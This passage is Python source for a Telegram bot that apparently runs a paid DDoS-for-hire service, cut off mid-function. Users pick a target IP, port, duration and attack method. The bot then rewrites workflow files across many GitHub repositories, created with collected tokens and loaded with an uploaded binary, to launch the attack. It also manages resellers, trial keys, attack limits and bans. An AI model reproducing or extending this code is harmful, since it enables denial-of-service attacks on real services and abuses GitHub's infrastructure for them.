        message = f"🔍 **SEARCH RESULTS FOR:** `{query}`\n━━━━━━━━━━━━━━━━━━━━\n\n"
        for uid, username, role, expiry, banned in results:
            ban_icon = "🚫" if banned else "✅"
            message += f"{ban_icon} `{uid}` - @{username} ({role})\n"
        await update.message.reply_text(message)
    elif step == "ban_user_id":
        try:
            ban_user_id = int(text.strip())
            temp_data[user_id]["ban_user_id"] = ban_user_id
            temp_data[user_id]["step"] = "ban_user_reason"
            await update.message.reply_text(
                f"🚫 **BAN USER - STEP 2/2**\n"
                f"━━━━━━━━━━━━━━━━━━━━\n"
                f"✅ User ID: `{ban_user_id}`\n\n"
                f"Send ban reason:\n\nExample: `Abuse`"
            )
        except ValueError:
            await update.message.reply_text("❌ Invalid user ID. Send a number:")
    elif step == "ban_user_reason":
        reason = text.strip()
        ban_user_id = temp_data[user_id]["ban_user_id"]
        ban_user(ban_user_id, reason)
        del temp_data[user_id]
        reply_markup = get_main_keyboard(user_id)
        await update.message.reply_text(
            f"✅ **USER BANNED**\n"
            f"━━━━━━━━━━━━━━━━━━━━\n"
            f"User ID: `{ban_user_id}`\n"
            f"Reason: {reason}",
            reply_markup=reply_markup
        )
        log_activity(user_id, "ban_user", f"Banned user {ban_user_id}: {reason}")
    elif step == "unban_user_id":
        try:
            unban_user_id = int(text.strip())
            unban_user(unban_user_id)
            del temp_data[user_id]
            reply_markup = get_main_keyboard(user_id)
            await update.message.reply_text(
                f"✅ **USER UNBANNED**\n"
                f"━━━━━━━━━━━━━━━━━━━━\n"
                f"User ID: `{unban_user_id}`",
                reply_markup=reply_markup
            )
            log_activity(user_id, "unban_user", f"Unbanned user {unban_user_id}")
        except ValueError:
            await update.message.reply_text("❌ Invalid user ID. Send a number:")
    elif step == "add_token":
        token = text.strip()
        repo_name = "soulcrack-tg"
        await update.message.reply_text("🔄 **ADDING TOKEN...**")
        try:
            g = Github(token)
            user = g.get_user()
            username = user.login
            repo, created = create_repository(token, repo_name)
            add_token_to_db(token, username, f"{username}/{repo_name}")
            binary_content = load_binary_file()
            if binary_content:
                upload_binary_to_repo(token, f"{username}/{repo_name}", binary_content)
            del temp_data[user_id]
            reply_markup = get_main_keyboard(user_id)
            status = "NEW REPO CREATED" if created else "ADDED TO EXISTING REPO"
            await update.message.reply_text(
                f"✅ **TOKEN ADDED - {status}**\n"
                f"━━━━━━━━━━━━━━━━━━━━\n"
                f"👤 Username: `{username}`\n"
                f"📁 Repo: `{repo_name}`",
                reply_markup=reply_markup
            )
            log_activity(user_id, "add_token", f"Added token for {username}")
        except Exception as e:
            await update.message.reply_text(f"❌ **ERROR**\n{str(e)}")
    elif step == "set_limit_user_id":
        try:
            target_user_id = int(text.strip())
            temp_data[user_id]["target_user_id"] = target_user_id
            temp_data[user_id]["step"] = "set_limit_value"
            await update.message.reply_text(
                f"🎯 **SET USER LIMIT - STEP 2/2**\n"
                f"━━━━━━━━━━━━━━━━━━━━\n"
                f"✅ User ID: `{target_user_id}`\n\n"
                f"Send new attack limit:\n\nExample: `50` or `100`"
            )
        except ValueError:
            await update.message.reply_text("❌ Invalid user ID. Send a number:")
    elif step == "set_limit_value":
        try:
            limit = int(text.strip())
            target_user_id = temp_data[user_id]["target_user_id"]
            conn = sqlite3.connect(DB_PATH)
            cursor = conn.cursor()
            cursor.execute('UPDATE users SET custom_attack_limit = ? WHERE user_id = ?', (limit, target_user_id))
            conn.commit()
            conn.close()
            del temp_data[user_id]
            reply_markup = get_main_keyboard(user_id)
            await update.message.reply_text(
                f"✅ **USER LIMIT UPDATED**\n"
                f"━━━━━━━━━━━━━━━━━━━━\n"
                f"User ID: `{target_user_id}`\n"
                f"New Limit: {limit}",
                reply_markup=reply_markup
            )
            log_activity(user_id, "set_user_limit", f"Set limit {limit} for user {target_user_id}")
        except ValueError:
            await update.message.reply_text("❌ Invalid limit. Send a number:")
    elif step == "broadcast_message":
        message_text = text.strip()
        del temp_data[user_id]
        await update.message.reply_text("📢 **SENDING BROADCAST...**")
        conn = sqlite3.connect(DB_PATH)
        cursor = conn.cursor()
        cursor.execute('SELECT user_id FROM users')
        all_users = cursor.fetchall()
        conn.close()
        success = 0
        failed = 0
        for (uid,) in all_users:
            try:
                await context.bot.send_message(
                    chat_id=uid,
                    text=f"📢 **BROADCAST**\n━━━━━━━━━━━━━━━━━━━━\n{message_text}"
                )
                success += 1
            except:
                failed += 1
        reply_markup = get_main_keyboard(user_id)
        await update.message.reply_text(
            f"✅ **BROADCAST COMPLETED**\n"
            f"━━━━━━━━━━━━━━━━━━━━\n"
            f"✅ Sent: {success}\n"
            f"❌ Failed: {failed}",
            reply_markup=reply_markup
        )
        log_activity(user_id, "broadcast", f"Sent to {success} users")
    elif step == "add_owner_id":
        try:
            owner_id = int(text.strip())
            temp_data[user_id]["owner_id"] = owner_id
            temp_data[user_id]["step"] = "add_owner_role"
            keyboard = [
                [InlineKeyboardButton("Full Owner", callback_data="owner_role_owner")],
                [InlineKeyboardButton("Limited Owner", callback_data="owner_role_limited_owner")],
                [InlineKeyboardButton("❌ Cancel", callback_data="cancel_operation")]
            ]
            reply_markup = InlineKeyboardMarkup(keyboard)
            await update.message.reply_text(
                f"👑 **ADD OWNER - STEP 2/3**\n"
                f"━━━━━━━━━━━━━━━━━━━━\n"
                f"✅ User ID: `{owner_id}`\n\n"
                f"Select owner type:",
                reply_markup=reply_markup
            )
        except ValueError:
            await update.message.reply_text("❌ Invalid user ID. Send a number:")
    elif step == "add_owner_username":
        username = text.strip()
        owner_id = temp_data[user_id]["owner_id"]
        owner_role = temp_data[user_id]["owner_role"]
        conn = sqlite3.connect(DB_PATH)
        cursor = conn.cursor()
        ref_code = generate_referral_code()
        cursor.execute('''
            INSERT OR REPLACE INTO users (user_id, username, role, expiry, added_by, added_date, referral_code)
            VALUES (?, ?, ?, ?, ?, ?, ?)
        ''', (owner_id, username, owner_role, "LIFETIME", user_id, 
              datetime.now().strftime("%Y-%m-%d %H:%M:%S"), ref_code))
        conn.commit()
        conn.close()
        del temp_data[user_id]
        reply_markup = get_main_keyboard(user_id)
        await update.message.reply_text(
            f"✅ **OWNER ADDED**\n"
            f"━━━━━━━━━━━━━━━━━━━━\n"
            f"User ID: `{owner_id}`\n"
            f"Username: @{username}\n"
            f"Role: {owner_role}",
            reply_markup=reply_markup
        )
        log_activity(user_id, "add_owner", f"Added owner {owner_id}")
        try:
            await context.bot.send_message(
                chat_id=owner_id,
                text=f"👑 **CONGRATULATIONS!**\n━━━━━━━━━━━━━━━━━━━━\nYou have been made an owner!"
            )
        except:
            pass
    elif step == "remove_owner_id":
        try:
            remove_owner_id = int(text.strip())
            conn = sqlite3.connect(DB_PATH)
            cursor = conn.cursor()
            cursor.execute('SELECT role FROM users WHERE user_id = ?', (remove_owner_id,))
            result = cursor.fetchone()
            if not result or 'owner' not in result[0]:
                await update.message.reply_text("❌ User is not an owner")
                conn.close()
                del temp_data[user_id]
                return
            if result[0] == 'primary_owner':
                await update.message.reply_text("❌ Cannot remove primary owner")
                conn.close()
                del temp_data[user_id]
                return
            cursor.execute('DELETE FROM users WHERE user_id = ?', (remove_owner_id,))
            conn.commit()
            conn.close()
            del temp_data[user_id]
            reply_markup = get_main_keyboard(user_id)
            await update.message.reply_text(
                f"✅ **OWNER REMOVED**\n"
                f"━━━━━━━━━━━━━━━━━━━━\n"
                f"User ID: `{remove_owner_id}`",
                reply_markup=reply_markup
            )
            log_activity(user_id, "remove_owner", f"Removed owner {remove_owner_id}")
        except ValueError:
            await update.message.reply_text("❌ Invalid user ID. Send a number:")
    elif step == "add_reseller_id":
        try:
            reseller_id = int(text.strip())
            temp_data[user_id]["reseller_id"] = reseller_id
            temp_data[user_id]["step"] = "add_reseller_username"
            await update.message.reply_text(
                f"💰 **ADD RESELLER - STEP 2/2**\n"
                f"━━━━━━━━━━━━━━━━━━━━\n"
                f"✅ User ID: `{reseller_id}`\n\n"
                f"Send username:\n\nExample: `john`"
            )
        except ValueError:
            await update.message.reply_text("❌ Invalid user ID. Send a number:")
    elif step == "add_reseller_username":
        username = text.strip()
        reseller_id = temp_data[user_id]["reseller_id"]
        conn = sqlite3.connect(DB_PATH)
        cursor = conn.cursor()
        ref_code = generate_referral_code()
        cursor.execute('''
            INSERT OR REPLACE INTO users (user_id, username, role, expiry, added_by, added_date, referral_code)
            VALUES (?, ?, ?, ?, ?, ?, ?)
        ''', (reseller_id, username, "reseller", "LIFETIME", user_id, 
              datetime.now().strftime("%Y-%m-%d %H:%M:%S"), ref_code))
        conn.commit()
        conn.close()
        del temp_data[user_id]
        reply_markup = get_main_keyboard(user_id)
        await update.message.reply_text(
            f"✅ **RESELLER ADDED**\n"
            f"━━━━━━━━━━━━━━━━━━━━\n"
            f"User ID: `{reseller_id}`\n"
            f"Username: @{username}",
            reply_markup=reply_markup
        )
        log_activity(user_id, "add_reseller", f"Added reseller {reseller_id}")
    elif step == "remove_token_id":
        try:
            token_num = int(text.strip())
            tokens = get_all_tokens()
            if token_num < 1 or token_num > len(tokens):
                await update.message.reply_text(f"❌ Invalid number. Use 1-{len(tokens)}")
                return
            token_id = tokens[token_num - 1][0]
            conn = sqlite3.connect(DB_PATH)
            cursor = conn.cursor()
            cursor.execute('DELETE FROM tokens WHERE id = ?', (token_id,))
            conn.commit()
            conn.close()
            del temp_data[user_id]
            reply_markup = get_main_keyboard(user_id)
            await update.message.reply_text(
                f"✅ **TOKEN REMOVED**\n"
                f"━━━━━━━━━━━━━━━━━━━━\n"
                f"Token #{token_num} has been removed",
                reply_markup=reply_markup
            )
            log_activity(user_id, "remove_token", f"Removed token #{token_num}")
        except ValueError:
            await update.message.reply_text("❌ Invalid number. Send a number:")
    elif step == "set_priority_token_id":
        try:
            token_num = int(text.strip())
            tokens = get_all_tokens()
            if token_num < 1 or token_num > len(tokens):
                await update.message.reply_text(f"❌ Invalid number. Use 1-{len(tokens)}")
                return
            temp_data[user_id]["token_id"] = tokens[token_num - 1][0]
            temp_data[user_id]["step"] = "set_priority_value"
            await update.message.reply_text(
                f"⭐ **SET TOKEN PRIORITY - STEP 2/2**\n"
                f"━━━━━━━━━━━━━━━━━━━━\n"
                f"✅ Token #{token_num}\n\n"
                f"Send priority (1-10, higher = more priority):\n\nExample: `5`"
            )
        except ValueError:
            await update.message.reply_text("❌ Invalid number. Send a number:")
    elif step == "set_priority_value":
        try:
            priority = int(text.strip())
            if priority < 1 or priority > 10:
                await update.message.reply_text("❌ Priority must be between 1-10")
                return
            token_id = temp_data[user_id]["token_id"]
            conn = sqlite3.connect(DB_PATH)
            cursor = conn.cursor()
            cursor.execute('UPDATE tokens SET priority = ? WHERE id = ?', (priority, token_id))
            conn.commit()
            conn.close()
            del temp_data[user_id]
            reply_markup = get_main_keyboard(user_id)
            await update.message.reply_text(
                f"✅ **PRIORITY UPDATED**\n"
                f"━━━━━━━━━━━━━━━━━━━━\n"
                f"New priority: {priority}",
                reply_markup=reply_markup
            )
            log_activity(user_id, "set_token_priority", f"Set priority {priority}")
        except ValueError:
            await update.message.reply_text("❌ Invalid priority. Send a number:")
    elif step == "set_welcome_message":
        welcome_msg = text.strip()
        set_setting('welcome_message', welcome_msg)
        del temp_data[user_id]
        reply_markup = get_main_keyboard(user_id)
        await update.message.reply_text(
            f"✅ **WELCOME MESSAGE UPDATED**\n"
            f"━━━━━━━━━━━━━━━━━━━━\n"
            f"New message: {welcome_msg}",
            reply_markup=reply_markup
        )
        log_activity(user_id, "set_welcome_message", welcome_msg)
    elif step == "set_cooldown_custom":
        try:
            cooldown = int(text.strip())
            set_setting('cooldown_duration', str(cooldown))
            del temp_data[user_id]
            reply_markup = get_main_keyboard(user_id)
            await update.message.reply_text(
                f"✅ **COOLDOWN UPDATED**\n"
                f"━━━━━━━━━━━━━━━━━━━━\n"
                f"New cooldown: {cooldown}s",
                reply_markup=reply_markup
            )
            log_activity(user_id, "set_cooldown", f"Set to {cooldown}s")
        except ValueError:
            await update.message.reply_text("❌ Invalid value. Send a number:")
    elif step == "set_maxattacks_custom":
        try:
            max_attacks = int(text.strip())
            set_setting('max_attacks', str(max_attacks))
            del temp_data[user_id]
            reply_markup = get_main_keyboard(user_id)
            await update.message.reply_text(
                f"✅ **MAX ATTACKS UPDATED**\n"
                f"━━━━━━━━━━━━━━━━━━━━\n"
                f"New limit: {max_attacks}",
                reply_markup=reply_markup
            )
            log_activity(user_id, "set_max_attacks", f"Set to {max_attacks}")
        except ValueError:
            await update.message.reply_text("❌ Invalid value. Send a number:")
    elif step == "set_concurrent_custom":
        try:
            concurrent = int(text.strip())
            set_setting('max_concurrent_attacks', str(concurrent))
            del temp_data[user_id]
            reply_markup = get_main_keyboard(user_id)
            await update.message.reply_text(
                f"✅ **MAX CONCURRENT UPDATED**\n"
                f"━━━━━━━━━━━━━━━━━━━━\n"
                f"New limit: {concurrent}",
                reply_markup=reply_markup
            )
            log_activity(user_id, "set_max_concurrent", f"Set to {concurrent}")
        except ValueError:
            await update.message.reply_text("❌ Invalid value. Send a number:")
    elif step == "set_autoban_custom":
        try:
            threshold = int(text.strip())
            set_setting('auto_ban_threshold', str(threshold))
            del temp_data[user_id]
            reply_markup = get_main_keyboard(user_id)
            await update.message.reply_text(
                f"✅ **AUTO-BAN THRESHOLD UPDATED**\n"
                f"━━━━━━━━━━━━━━━━━━━━\n"
                f"New threshold: {threshold}",
                reply_markup=reply_markup
            )
            log_activity(user_id, "set_auto_ban", f"Set to {threshold}")
        except ValueError:
            await update.message.reply_text("❌ Invalid value. Send a number:")
    elif step == "set_refbonus_custom":
        try:
            bonus = int(text.strip())
            set_setting('referral_bonus_days', str(bonus))
            del temp_data[user_id]
            reply_markup = get_main_keyboard(user_id)
            await update.message.reply_text(
                f"✅ **REFERRAL BONUS UPDATED**\n"
                f"━━━━━━━━━━━━━━━━━━━━\n"
                f"New bonus: {bonus} days",
                reply_markup=reply_markup
            )
            log_activity(user_id, "set_referral_bonus", f"Set to {bonus} days")
        except ValueError:
            await update.message.reply_text("❌ Invalid value. Send a number:")
async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user_id = query.from_user.id
    data = query.data
    if data == "cancel_operation":
        if user_id in temp_data:
            del temp_data[user_id]
        reply_markup = get_main_keyboard(user_id)
        await query.message.edit_text("❌ **OPERATION CANCELLED**")
        await query.message.reply_text("Use buttons to continue:", reply_markup=reply_markup)
        return
    if data.startswith("duration_"):
        duration = int(data.split("_")[1])
        if user_id not in temp_data:
            await query.message.edit_text("❌ **SESSION EXPIRED**")
            return
        temp_data[user_id]["duration"] = duration
        temp_data[user_id]["step"] = "attack_method"
        keyboard = []
        for i in range(0, len(ATTACK_METHODS), 2):
            row = []
            row.append(InlineKeyboardButton(ATTACK_METHODS[i], callback_data=f"method_{i}"))
            if i + 1 < len(ATTACK_METHODS):
                row.append(InlineKeyboardButton(ATTACK_METHODS[i + 1], callback_data=f"method_{i+1}"))
            keyboard.append(row)
        keyboard.append([InlineKeyboardButton("❌ Cancel", callback_data="cancel_operation")])
        reply_markup = InlineKeyboardMarkup(keyboard)
        await query.message.edit_text(
            f"🎯 **LAUNCH ATTACK - STEP 4/4**\n"
            f"━━━━━━━━━━━━━━━━━━━━\n"
            f"✅ IP: `{temp_data[user_id]['ip']}`\n"
            f"✅ Port: `{temp_data[user_id]['port']}`\n"
            f"✅ Duration: `{duration}s`\n\n"
            f"Select attack method:",
            reply_markup=reply_markup
        )
    elif data.startswith("method_"):
        method_idx = int(data.split("_")[1])
        method = ATTACK_METHODS[method_idx]
        if user_id not in temp_data:
            await query.message.edit_text("❌ **SESSION EXPIRED**")
            return
        ip = temp_data[user_id]["ip"]
        port = temp_data[user_id]["port"]
        duration = temp_data[user_id]["duration"]
        del temp_data[user_id]
        await query.message.edit_text("🔄 **STARTING ATTACK...**")
        attack_id = f"atk_{user_id}_{int(time.time())}"
        start_attack(attack_id, ip, port, duration, user_id, method)
        tokens = get_all_tokens()
        success_count = 0
        for token in tokens:
            token_id = token[0]
            token_str = token[1]
            repo = token[3]
            if update_yml_file(token_str, repo, ip, port, duration, method):
                success_count += 1
                increment_token_usage(token_id)
        reply_markup = get_main_keyboard(user_id)
        await query.message.edit_text(
            f"🎯 **ATTACK STARTED!**\n"
            f"━━━━━━━━━━━━━━━━━━━━\n"
            f"🆔 Attack ID: `{attack_id}`\n"
            f"🌐 Target: `{ip}:{port}`\n"
            f"⏱️ Duration: `{duration}s`\n"
            f"⚡ Method: {method}\n"
            f"🖥️ Servers: `{success_count}`"
        )
        await query.message.reply_text("Use buttons to continue:", reply_markup=reply_markup)
        log_activity(user_id, "start_attack", f"Attack {attack_id} on {ip}:{port}")
        def auto_finish():
            time.sleep(duration)
            finish_attack(attack_id, 100, success_count)
        threading.Thread(target=auto_finish, daemon=True).start()
    elif data.startswith("stop_attack_"):
        attack_id = data.replace("stop_attack_", "")
        if attack_id in current_attacks:
            tokens = get_all_tokens()
            total_stopped = 0
            for token in tokens:
                token_str = token[1]
                repo = token[3]
                stopped = instant_stop_all_jobs(token_str, repo)
                total_stopped += stopped
            stop_attack(attack_id)
            await query.message.edit_text(
                f"🛑 **ATTACK STOPPED**\n"
                f"━━━━━━━━━━━━━━━━━━━━\n"
                f"🆔 Attack ID: `{attack_id}`\n"
                f"✅ Workflows cancelled: {total_stopped}"
            )
            log_activity(user_id, "stop_attack", f"Stopped attack {attack_id}")
        else:
            await query.message.edit_text("❌ **ATTACK NOT FOUND**")
    elif data == "stop_all_attacks":
        tokens = get_all_tokens()
        total_stopped = 0
        for token in tokens:
            token_str = token[1]
            repo = token[3]
            stopped = instant_stop_all_jobs(token_str, repo)
            total_stopped += stopped
        for attack_id in list(current_attacks.keys()):
            stop_attack(attack_id)
        await query.message.edit_text(
            f"🛑 **ALL ATTACKS STOPPED**\n"
            f"━━━━━━━━━━━━━━━━━━━━\n"
            f"✅ Workflows cancelled: {total_stopped}"
        )
        log_activity(user_id, "stop_all_attacks", f"Stopped all attacks")
    elif data.startswith("days_"):
        days_str = data.split("_")[1]
        if user_id not in temp_data:
            await query.message.edit_text("❌ **SESSION EXPIRED**")
            return
        new_user_id = temp_data[user_id]["new_user_id"]
        if days_str == "custom":
            temp_data[user_id]["step"] = "add_user_custom_days"
            await query.message.edit_text(
                f"➕ **ADD USER - CUSTOM DAYS**\n"
                f"━━━━━━━━━━━━━━━━━━━━\n"
                f"✅ User ID: `{new_user_id}`\n\n"
                f"Send number of days:\n\nExample: `15` or `60`"
            )
            return
        days = int(days_str)
        del temp_data[user_id]
        conn = sqlite3.connect(DB_PATH)
        cursor = conn.cursor()
        cursor.execute('DELETE FROM pending_users WHERE user_id = ?', (new_user_id,))
        if days == 0:
            expiry = "LIFETIME"
        else:
            expiry = str(time.time() + (days * 24 * 60 * 60))
        ref_code = generate_referral_code()
        cursor.execute('''
            INSERT OR REPLACE INTO users (user_id, username, role, expiry, added_by, added_date, referral_code)
            VALUES (?, ?, ?, ?, ?, ?, ?)
        ''', (new_user_id, f"user_{new_user_id}", "user", expiry, user_id, 
              datetime.now().strftime("%Y-%m-%d %H:%M:%S"), ref_code))
        conn.commit()
        conn.close()
        reply_markup = get_main_keyboard(user_id)
        duration_text = "Lifetime" if days == 0 else f"{days} days"
        await query.message.edit_text(
            f"✅ **USER ADDED**\n"
            f"━━━━━━━━━━━━━━━━━━━━\n"
            f"User ID: `{new_user_id}`\n"
            f"Duration: {duration_text}"
        )
        await query.message.reply_text("Use buttons to continue:", reply_markup=reply_markup)
        log_activity(user_id, "add_user", f"Added user {new_user_id} for {duration_text}")
        try:
            await context.bot.send_message(
                chat_id=new_user_id,
                text=f"✅ **ACCESS APPROVED!**\n━━━━━━━━━━━━━━━━━━━━\nYour access has been approved for {duration_text}."
            )
        except:
            pass
    elif data.startswith("cooldown_"):
        value = data.split("_")[1]
        if value == "custom":
            temp_data[user_id] = {"step": "set_cooldown_custom"}
            await query.message.edit_text(
                "⏱️ **SET CUSTOM COOLDOWN**\n"
                "━━━━━━━━━━━━━━━━━━━━\n"
                "Send cooldown duration in seconds:\n\nExample: `45`"
            )
            return
        cooldown = int(value)
        set_setting('cooldown_duration', str(cooldown))
        await query.message.edit_text(
            f"✅ **COOLDOWN UPDATED**\n"
            f"━━━━━━━━━━━━━━━━━━━━\n"
            f"New cooldown: {cooldown}s"
        )
        log_activity(user_id, "set_cooldown", f"Set to {cooldown}s")
    elif data.startswith("maxattacks_"):
        value = data.split("_")[1]
        if value == "custom":
            temp_data[user_id] = {"step": "set_maxattacks_custom"}
            await query.message.edit_text(
                "🎯 **SET CUSTOM MAX ATTACKS**\n"
                "━━━━━━━━━━━━━━━━━━━━\n"
                "Send max attacks per user:\n\nExample: `75`"
            )
            return
        max_attacks = int(value)
        set_setting('max_attacks', str(max_attacks))
        display = "Unlimited" if max_attacks >= 999999 else str(max_attacks)
        await query.message.edit_text(
            f"✅ **MAX ATTACKS UPDATED**\n"
            f"━━━━━━━━━━━━━━━━━━━━\n"
            f"New limit: {display}"
        )
        log_activity(user_id, "set_max_attacks", f"Set to {max_attacks}")
    elif data.startswith("concurrent_"):
        value = data.split("_")[1]
        if value == "custom":
            temp_data[user_id] = {"step": "set_concurrent_custom"}
            await query.message.edit_text(
                "🚀 **SET CUSTOM MAX CONCURRENT**\n"
                "━━━━━━━━━━━━━━━━━━━━\n"
                "Send max concurrent attacks:\n\nExample: `7`"
            )
            return
        concurrent = int(value)
        set_setting('max_concurrent_attacks', str(concurrent))
        await query.message.edit_text(
            f"✅ **MAX CONCURRENT UPDATED**\n"
            f"━━━━━━━━━━━━━━━━━━━━\n"
            f"New limit: {concurrent}"
        )
        log_activity(user_id, "set_max_concurrent", f"Set to {concurrent}")
    elif data.startswith("autoban_"):
        value = data.split("_")[1]
        if value == "custom":
            temp_data[user_id] = {"step": "set_autoban_custom"}
            await query.message.edit_text(
                "🚫 **SET CUSTOM AUTO-BAN THRESHOLD**\n"
                "━━━━━━━━━━━━━━━━━━━━\n"
                "Send failed attacks before auto-ban:\n\nExample: `7`"
            )
            return
        threshold = int(value)
        set_setting('auto_ban_threshold', str(threshold))
        display = "Disabled" if threshold >= 999999 else str(threshold)
        await query.message.edit_text(
            f"✅ **AUTO-BAN THRESHOLD UPDATED**\n"
            f"━━━━━━━━━━━━━━━━━━━━\n"
            f"New threshold: {display}"
        )
        log_activity(user_id, "set_auto_ban", f"Set to {threshold}")
    elif data.startswith("ratelimit_"):
        value = int(data.split("_")[1])
        set_setting('rate_limit_seconds', str(value))
        await query.message.edit_text(
            f"✅ **RATE LIMIT UPDATED**\n"
            f"━━━━━━━━━━━━━━━━━━━━\n"
            f"New rate limit: {value}s"
        )
        log_activity(user_id, "set_rate_limit", f"Set to {value}s")
    elif data.startswith("refbonus_"):
        value = data.split("_")[1]
        if value == "custom":
            temp_data[user_id] = {"step": "set_refbonus_custom"}
            await query.message.edit_text(
                "🎁 **SET CUSTOM REFERRAL BONUS**\n"
                "━━━━━━━━━━━━━━━━━━━━\n"
                "Send bonus days per referral:\n\nExample: `5`"
            )
            return
        bonus = int(value)
        set_setting('referral_bonus_days', str(bonus))
        await query.message.edit_text(
            f"✅ **REFERRAL BONUS UPDATED**\n"
            f"━━━━━━━━━━━━━━━━━━━━\n"
            f"New bonus: {bonus} days per referral"
        )
        log_activity(user_id, "set_referral_bonus", f"Set to {bonus} days")
    elif data.startswith("owner_role_"):
        role = data.replace("owner_role_", "")
        if user_id not in temp_data:
            await query.message.edit_text("❌ **SESSION EXPIRED**")
            return
        temp_data[user_id]["owner_role"] = role
        temp_data[user_id]["step"] = "add_owner_username"
        await query.message.edit_text(
            f"👑 **ADD OWNER - STEP 3/3**\n"
            f"━━━━━━━━━━━━━━━━━━━━\n"
            f"✅ User ID: `{temp_data[user_id]['owner_id']}`\n"
            f"✅ Role: {role}\n\n"
            f"Send username:\n\nExample: `john`"
        )
    elif data.startswith("trial_"):
        hours = int(data.split("_")[1])
        key = f"TRL-{''.join(random.choices(string.ascii_uppercase + string.digits, k=12))}"
        expiry = time.time() + (hours * 3600)
        conn = sqlite3.connect(DB_PATH)
        cursor = conn.cursor()
        cursor.execute('''
            INSERT INTO trial_keys (key, hours, expiry, created_at, created_by)
            VALUES (?, ?, ?, ?, ?)
        ''', (key, hours, expiry, time.time(), user_id))
        conn.commit()
        conn.close()
        await query.message.edit_text(
            f"🔑 **TRIAL KEY GENERATED**\n"
            f"━━━━━━━━━━━━━━━━━━━━\n"
            f"Key: `{key}`\n"
            f"Duration: {hours} hours\n\n"
            f"Users can redeem with:\n`/redeem {key}`"
        )
        log_activity(user_id, "generate_trial", f"Generated {hours}h trial key")
async def broadcast_start(update: Update, user_id):
    if not is_owner(user_id):
        await update.message.reply_text("⚠️ **ACCESS DENIED**")
        return
    temp_data[user_id] = {"step": "broadcast_message"}
    reply_markup = get_cancel_keyboard()
    await update.message.reply_text(
        "📢 **BROADCAST MESSAGE**\n"
        "━━━━━━━━━━━━━━━━━━━━\n"
        "Send the message to broadcast to all users:",
        reply_markup=reply_markup
    )
async def upload_binary_start(update: Update, user_id):
    if not is_owner(user_id):
        await update.message.reply_text("⚠️ **ACCESS DENIED**")
        return
    temp_data[user_id] = {"step": "binary_upload"}
    reply_markup = get_cancel_keyboard()
    await update.message.reply_text(
        "📤 **UPLOAD BINARY**\n"
        "━━━━━━━━━━━━━━━━━━━━\n"
        "Send the binary file to upload to all repositories:",
        reply_markup=reply_markup
    )
async def add_owner_start(update: Update, user_id):
    if not is_primary_owner(user_id):
        await update.message.reply_text("⚠️ **ACCESS DENIED** - Primary owner only")
        return
    temp_data[user_id] = {"step": "add_owner_id"}
    reply_markup = get_cancel_keyboard()
    await update.message.reply_text(
        "👑 **ADD OWNER - STEP 1/3**\n"
        "━━━━━━━━━━━━━━━━━━━━\n"
        "Send the user ID to make owner:\n\n"
        "Example: `123456789`",
        reply_markup=reply_markup
    )
async def remove_owner_start(update: Update, user_id):
    if not is_primary_owner(user_id):
        await update.message.reply_text("⚠️ **ACCESS DENIED** - Primary owner only")
        return
    temp_data[user_id] = {"step": "remove_owner_id"}
    reply_markup = get_cancel_keyboard()
    await update.message.reply_text(
        "🗑️ **REMOVE OWNER**\n"
        "━━━━━━━━━━━━━━━━━━━━\n"
        "Send the user ID to remove from owners:\n\n"
        "Example: `123456789`",
        reply_markup=reply_markup
    )
async def add_reseller_start(update: Update, user_id):
    if not is_owner(user_id):
        await update.message.reply_text("⚠️ **ACCESS DENIED**")
        return
    temp_data[user_id] = {"step": "add_reseller_id"}
    reply_markup = get_cancel_keyboard()
    await update.message.reply_text(
        "💰 **ADD RESELLER - STEP 1/2**\n"
        "━━━━━━━━━━━━━━━━━━━━\n"
        "Send the user ID to make reseller:\n\n"
        "Example: `123456789`",
        reply_markup=reply_markup
    )
async def show_resellers_list(update: Update, user_id):
    if not is_owner(user_id):
        await update.message.reply_text("⚠️ **ACCESS DENIED**")
        return
    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()
    cursor.execute('SELECT user_id, username, total_attacks FROM users WHERE role = "reseller"')
    resellers = cursor.fetchall()
    conn.close()
    if not resellers:
        await update.message.reply_text("📭 **NO RESELLERS FOUND**")
        return
    message = "💰 **RESELLERS LIST**\n━━━━━━━━━━━━━━━━━━━━\n\n"
    for uid, uname, attacks in resellers:
        message += f"• `{uid}` - @{uname}\n  Attacks: {attacks}\n\n"
    await update.message.reply_text(message)
async def show_owners_list(update: Update, user_id):
    if not is_owner(user_id):
        await update.message.reply_text("⚠️ **ACCESS DENIED**")
        return
    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()
    cursor.execute('SELECT user_id, username, role FROM users WHERE role LIKE "%owner%"')
    owners = cursor.fetchall()
    conn.close()
    if not owners:
        await update.message.reply_text("📭 **NO OWNERS FOUND**")
        return
    message = "👑 **OWNERS LIST**\n━━━━━━━━━━━━━━━━━━━━\n\n"
    for uid, uname, role in owners:
        role_icon = "👑" if role == "primary_owner" else "🔱" if role == "owner" else "⚜️"
        message += f"{role_icon} `{uid}` - @{uname} ({role})\n"
    await update.message.reply_text(message)
async def restore_database_start(update: Update, user_id):
    if not is_primary_owner(user_id):
        await update.message.reply_text("⚠️ **ACCESS DENIED** - Primary owner only")
        return
    temp_data[user_id] = {"step": "restore_database"}
    reply_markup = get_cancel_keyboard()
    await update.message.reply_text(
        "♻️ **RESTORE DATABASE**\n"
        "━━━━━━━━━━━━━━━━━━━━\n"
        "⚠️ **WARNING:** This will overwrite current database!\n\n"
        "Send the backup database file (.db file):",
        reply_markup=reply_markup
    )
async def set_cooldown_start(update: Update, user_id):
    if not (is_owner(user_id) or is_admin(user_id)):
        await update.message.reply_text("⚠️ **ACCESS DENIED**")
        return
    keyboard = [
        [InlineKeyboardButton("10s", callback_data="cooldown_10"),
         InlineKeyboardButton("20s", callback_data="cooldown_20"),
         InlineKeyboardButton("30s", callback_data="cooldown_30")],
        [InlineKeyboardButton("40s", callback_data="cooldown_40"),
         InlineKeyboardButton("60s", callback_data="cooldown_60"),
         InlineKeyboardButton("120s", callback_data="cooldown_120")],
        [InlineKeyboardButton("Custom", callback_data="cooldown_custom"),
         InlineKeyboardButton("❌ Cancel", callback_data="cancel_operation")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    current = get_setting('cooldown_duration', '40')
    await update.message.reply_text(
        f"⏱️ **SET COOLDOWN**\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"Current: {current}s\n\n"
        f"Select new cooldown duration:",
        reply_markup=reply_markup
    )
async def set_max_attacks_start(update: Update, user_id):
    if not (is_owner(user_id) or is_admin(user_id)):
        await update.message.reply_text("⚠️ **ACCESS DENIED**")
        return
    keyboard = [
